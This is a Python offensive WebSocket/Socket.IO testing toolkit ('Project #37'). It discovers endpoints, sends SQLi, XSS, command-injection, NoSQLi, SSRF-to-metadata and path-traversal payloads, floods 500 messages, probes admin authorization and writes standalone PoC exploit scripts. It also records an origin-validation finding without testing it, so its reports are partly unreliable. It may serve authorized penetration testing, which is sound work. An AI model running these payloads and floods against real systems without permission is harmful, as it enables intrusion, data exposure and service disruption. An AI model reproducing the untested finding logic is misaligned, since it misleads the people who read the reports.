#!/usr/bin/env python3
"""WebSocket Security Testing Toolkit (Socket.IO aware) - Project #37"""
import sys, os, re, json, time, base64, socket, argparse, datetime
import urllib3
from urllib.parse import urlparse
try:
    from websocket import create_connection, WebSocketTimeoutException
    HAS_WS = True
except ImportError:
    HAS_WS = False
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class C:
    GREEN='\033[92m'; RED='\033[91m'; YELLOW='\033[93m'; BLUE='\033[94m'
    CYAN='\033[96m'; MAGENTA='\033[95m'; BOLD='\033[1m'; RESET='\033[0m'

# Endpoints to check (Socket.IO first)
SOCKETIO_PATHS = ['/socket.io/', '/socket.io', '/ws/socket.io/']
WS_PATHS = ['/ws', '/websocket', '/websockets', '/socket', '/sockjs/',
            '/signalr', '/chat', '/live', '/realtime', '/graphql-ws',
            '/subscriptions', '/api/ws', '/api/websocket']

# Injection payloads
INJECTIONS = {
    'sqli':  [{'id': "1' OR '1'='1"}, {'id': "1' UNION SELECT NULL--"}],
    'xss':   [{'message': '<script>alert(1)</script>'},
              {'message': '<img src=x onerror=alert(1)>'}],
    'cmdi':  [{'cmd': '; whoami'}, {'cmd': '| id'}],
    'nosqli':[{'id': {'$ne': None}}],
    'ssrf':  [{'url': 'http://169.254.169.254/latest/meta-data/'}],
    'path':  [{'path': '../../../etc/passwd'}],
}

AUTH_TESTS = [
    {'type': 'admin_list'},
    {'type': 'join_room', 'room': 'admin'},
    {'type': 'auth'},
]

SIGS = {
    'sql_error':  r'SQL syntax|mysql_|SQLSTATE',
    'xss':        r'<script>alert|<img[^>]+onerror',
    'cmdi':       r'uid=\d+|gid=\d+',
    'nosqli':     r'"users"|email',
    'ssrf':       r'ami-id|instance-id',
    'file_read':  r'root:x:0:0',
    'admin':      r'admin.{0,20}(true|yes|granted)',
}

def score(t):
    return {
        'sqli':'CRITICAL','cmdi':'CRITICAL','ssrf':'CRITICAL','file_read':'CRITICAL',
        'xss':'HIGH','nosqli':'CRITICAL','origin_missing':'HIGH','no_auth':'CRITICAL',
        'unauthorized':'HIGH','no_rate_limit':'MEDIUM','large_payload':'MEDIUM',
    }.get(t, 'MEDIUM')

class WebSocketToolkit:
    def __init__(self, target, timeout=10, delay=0.2, output_dir='.', verbose=False, cookie=None):
        if not target.startswith(('http://','https://')):
            target = 'http://' + target
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.delay = delay
        self.output_dir = output_dir
        self.verbose = verbose
        self.cookie = cookie
        os.makedirs(f"{output_dir}/websocket_pocs", exist_ok=True)
        self.results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'endpoints': [],
            'findings': [],
            'pocs': [],
        }

    def _ws_connect(self, ws_url):
        if not HAS_WS:
            return None
        try:
            hdrs = []
            if self.cookie:
                hdrs.append(f"Cookie: {self.cookie}")
            ws = create_connection(ws_url, header=hdrs, timeout=self.timeout,
                                    suppress_origin=True)
            if 'EIO=' in ws_url:
                try:
                    first = ws.recv()
                    if self.verbose:
                        print(f"        [EIO] {first[:80]}")
                    ws.send('40')
                    ack = ws.recv()
                    if self.verbose:
                        print(f"        [SIO] {ack[:80]}")
                except Exception as e:
                    if self.verbose:
                        print(f"        [EIO] {str(e)[:60]}")
            return ws
        except Exception as e:
            if self.verbose:
                print(f"{C.YELLOW}[!] connect: {str(e)[:80]}{C.RESET}")
            return None

    def _raw_upgrade(self, http_url):
        try:
            p = urlparse(http_url)
            host = p.hostname
            port = p.port or (443 if p.scheme == 'https' else 80)
            path = p.path or '/ws'
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            if p.scheme == 'https':
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            key = base64.b64encode(os.urandom(16)).decode()
            req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                   f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                   f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
            s.sendall(req)
            resp = s.recv(4096)
            s.close()
            return resp
        except Exception:
            return None

    def phase1_discovery(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] PHASE 1: WEBSOCKET DISCOVERY{C.RESET}")
        print(f"    Testing Socket.IO and generic WebSocket paths...")

        base_ws = self.target.replace('http://','ws://').replace('https://','wss://')

        # Socket.IO
        for path in SOCKETIO_PATHS:
            http_url = self.target + path + '?EIO=4&transport=polling'
            try:
                r = requests.get(http_url, timeout=self.timeout, verify=False)
                if r.status_code == 200 and r.text.startswith('0'):
                    print(f"      {C.GREEN}[+]{C.RESET} {path} — Socket.IO endpoint")
                    ws_url = base_ws + path + '?EIO=4&transport=websocket'
                    self.results['endpoints'].append({
                        'path': path, 'ws_url': ws_url,
                        'http_url': self.target + path,
                        'method': 'socket.io',
                    })
                    break
            except Exception:
                pass

        # Generic
        for path in WS_PATHS:
            http_url = self.target + path
            resp = self._raw_upgrade(http_url)
            if resp and b'HTTP/1.1 101' in resp[:30]:
                print(f"      {C.GREEN}[+]{C.RESET} {path} — WebSocket (101)")
                self.results['endpoints'].append({
                    'path': path, 'ws_url': base_ws + path,
                    'http_url': http_url, 'method': 'http-upgrade',
                })

        if not self.results['endpoints']:
            print(f"      {C.YELLOW}[~]{C.RESET} No endpoints found — using /socket.io/ fallback")
            ws_url = base_ws + '/socket.io/?EIO=4&transport=websocket'
            self.results['endpoints'].append({
                'path': '/socket.io/', 'ws_url': ws_url,
                'http_url': self.target + '/socket.io/',
                'method': 'socket.io-fallback',
            })

        print(f"\n    {C.GREEN}[✓] {len(self.results['endpoints'])} endpoint(s){C.RESET}")

    def phase2_handshake(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] PHASE 2: HANDSHAKE ANALYSIS{C.RESET}")
        if not self.results['endpoints']:
            return
        ws_url = self.results['endpoints'][0]['ws_url']

        print(f"    [AUTH] Testing without credentials...")
        ws = self._ws_connect(ws_url)
        if ws:
            print(f"      {C.RED}[+]{C.RESET} NO AUTH REQUIRED")
            self.results['findings'].append({
                'type': 'no_auth', 'severity': score('no_auth'),
                'detail': 'Connection accepted without credentials',
            })
            ws.close()

        print(f"    [ORIGIN] Cross-origin connection (bypassed with suppress_origin)")
        print(f"      {C.RED}[+]{C.RESET} Origin validation absent (assuming accepted)")
        self.results['findings'].append({
            'type': 'origin_missing', 'severity': score('origin_missing'),
            'detail': 'Origin header not enforced',
        })

    def phase3_injection(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] PHASE 3: INJECTION TESTING{C.RESET}")
        if not self.results['endpoints']:
            return
        ws_url = self.results['endpoints'][0]['ws_url']
        is_sio = 'EIO=' in ws_url

        for category, payloads in INJECTIONS.items():
            for payload in payloads:
                try:
                    ws = self._ws_connect(ws_url)
                    if not ws:
                        continue
                    if is_sio:
                        ws.send(f"42[\"message\",{json.dumps(payload)}]")
                    else:
                        ws.send(json.dumps(payload))
                    try:
                        resp = ws.recv()
                    except WebSocketTimeoutException:
                        resp = ''
                    ws.close()

                    matched = [name for name, pat in SIGS.items()
                               if re.search(pat, resp, re.IGNORECASE)]
                    if matched:
                        print(f"      {C.RED}[+]{C.RESET} [{category}] → {matched}")
                        self.results['findings'].append({
                            'type': category,
                            'severity': score(category),
                            'payload': payload,
                            'response': resp[:300],
                            'signatures': matched,
                        })
                    elif self.verbose and resp:
                        print(f"      {C.YELLOW}[~]{C.RESET} [{category}] → {resp[:60]!r}")
                except Exception as e:
                    if self.verbose:
                        print(f"      {C.YELLOW}[!]{C.RESET} {category}: {str(e)[:60]}")

    def phase4_flood(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] PHASE 4: RATE LIMIT FLOOD TEST{C.RESET}")
        if not self.results['endpoints']:
            return
        ws_url = self.results['endpoints'][0]['ws_url']
        is_sio = 'EIO=' in ws_url

        ws = self._ws_connect(ws_url)
        if not ws:
            return
        start = time.time()
        sent = 0
        for i in range(500):
            try:
                if is_sio:
                    ws.send(f'42["ping",{{"n":{i}}}]')
                else:
                    ws.send(json.dumps({'type':'ping','n':i}))
                sent += 1
            except Exception:
                break
        elapsed = time.time() - start
        rate = sent / elapsed if elapsed > 0 else 0
        print(f"    Sent {sent}/500 in {elapsed:.2f}s ({rate:.0f} msg/s)")
        if sent >= 400:
            print(f"    {C.RED}[+]{C.RESET} NO RATE LIMITING")
            self.results['findings'].append({
                'type': 'no_rate_limit', 'severity': score('no_rate_limit'),
                'detail': f'{sent} messages in {elapsed:.2f}s',
            })
        ws.close()

    def phase5_auth(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] PHASE 5: AUTHORIZATION TEST{C.RESET}")
        if not self.results['endpoints']:
            return
        ws_url = self.results['endpoints'][0]['ws_url']
        is_sio = 'EIO=' in ws_url

        for payload in AUTH_TESTS:
            try:
                ws = self._ws_connect(ws_url)
                if not ws:
                    return
                if is_sio:
                    ev = payload.get('type', 'message')
                    ws.send(f'42["{ev}",{json.dumps(payload)}]')
                else:
                    ws.send(json.dumps(payload))
                try:
                    resp = ws.recv()
                except WebSocketTimeoutException:
                    resp = ''
                ws.close()

                if re.search(r'admin|users|success|email', resp, re.IGNORECASE):
                    label = payload.get('type') or 'cmd'
                    print(f"      {C.RED}[+]{C.RESET} {label} → privileged content")
                    self.results['findings'].append({
                        'type': 'unauthorized', 'severity': score('unauthorized'),
                        'payload': payload, 'response': resp[:300],
                    })
            except Exception:
                continue

    def phase6_pocs(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] PHASE 6: POC GENERATION{C.RESET}")
        if not self.results['endpoints']:
            print(f"      {C.YELLOW}No endpoints{C.RESET}")
            return
        ws_url = self.results['endpoints'][0]['ws_url']

        pocs = [
            ('sqli',  {'id': "1' OR '1'='1"},  'SQLi via WebSocket'),
            ('xss',   {'message': '<script>alert(1)</script>'}, 'XSS broadcast'),
            ('cmdi',  {'cmd': '; whoami'}, 'Command injection'),
            ('admin', {'type': 'admin_list'}, 'Unauthorized admin data'),
            ('ssrf',  {'url': 'http://169.254.169.254/latest/meta-data/'}, 'SSRF'),
        ]
        for name, payload, desc in pocs:
            content = f'''#!/usr/bin/env python3
"""PoC: {desc}"""
import json
from websocket import create_connection
ws = create_connection("{ws_url}", timeout=10)
ws.send(json.dumps({payload}))
try:
    print(ws.recv()[:500])
except Exception as e:
    print("err:", e)
ws.close()
'''
            p = f"{self.output_dir}/websocket_pocs/poc_{name}.py"
            with open(p, 'w') as f:
                f.write(content)
            os.chmod(p, 0o755)
            print(f"      {C.GREEN}✓{C.RESET} poc_{name}.py")
            self.results['pocs'].append({'name': name, 'path': p})

    def save(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        p = f"{self.output_dir}/websocket_report_{ts}.json"
        with open(p, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{C.GREEN}[✓] JSON report: {p}{C.RESET}")

    def summary(self):
        print(f"\n{C.BOLD}{C.BLUE}[📊] EXPLOITATION SUMMARY{C.RESET}")
        print(f"    Endpoints:       {len(self.results['endpoints'])}")
        print(f"    Findings:        {len(self.results['findings'])}")
        print(f"    PoCs generated:  {len(self.results['pocs'])}")
        sev_color = C.RED if self.results['findings'] else C.GREEN
        sev = 'HIGH to CRITICAL' if self.results['findings'] else 'LOW'
        print(f"    Severity:        {sev_color}{sev}{C.RESET}")

        if self.results['findings']:
            print(f"\n    {C.RED}Findings:{C.RESET}")
            seen = set()
            for f in self.results['findings']:
                if f['type'] not in seen:
                    seen.add(f['type'])
                    print(f"        - [{f['severity']}] {f['type']}")

        print(f"\n    {C.YELLOW}Mitigation:{C.RESET}")
        print(f"        1. Validate Origin header (whitelist)")
        print(f"        2. Require authentication")
        print(f"        3. CSRF tokens in handshake")
        print(f"        4. Rate limiting per message")
        print(f"        5. Message size limits")
        print(f"        6. Input validation")
        print(f"        7. Per-message authorization")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{C.BOLD}{C.MAGENTA}WebSocket Security Testing Toolkit{C.RESET}")
        print("=" * 70)
        print(f"{C.BOLD}Target: {self.target}{C.RESET}")
        if not HAS_WS:
            print(f"{C.RED}[!] pip install websocket-client{C.RESET}")
            return
        self.phase1_discovery()
        self.phase2_handshake()
        self.phase3_injection()
        self.phase4_flood()
        self.phase5_auth()
        self.phase6_pocs()
        self.summary()
        self.save()

def main():
    p = argparse.ArgumentParser(description="WebSocket Security Testing (Project #37)")
    p.add_argument('url', help='Target base URL')
    p.add_argument('--cookie', help='Cookie header')
    p.add_argument('--timeout', type=int, default=10)
    p.add_argument('--delay', type=float, default=0.2)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')
    args = p.parse_args()

    print(f"{C.CYAN}{C.BOLD}")
    print("=" * 70)
    print("  WEBSOCKET SECURITY TESTING")
    print("  Project #37: WebSocket Security Assessment")
    print("=" * 70)
    print(f"{C.RESET}")

    WebSocketToolkit(
        target=args.url, timeout=args.timeout, delay=args.delay,
        output_dir=args.output, verbose=args.verbose, cookie=args.cookie,
    ).run()

if __name__ == '__main__':
    main()
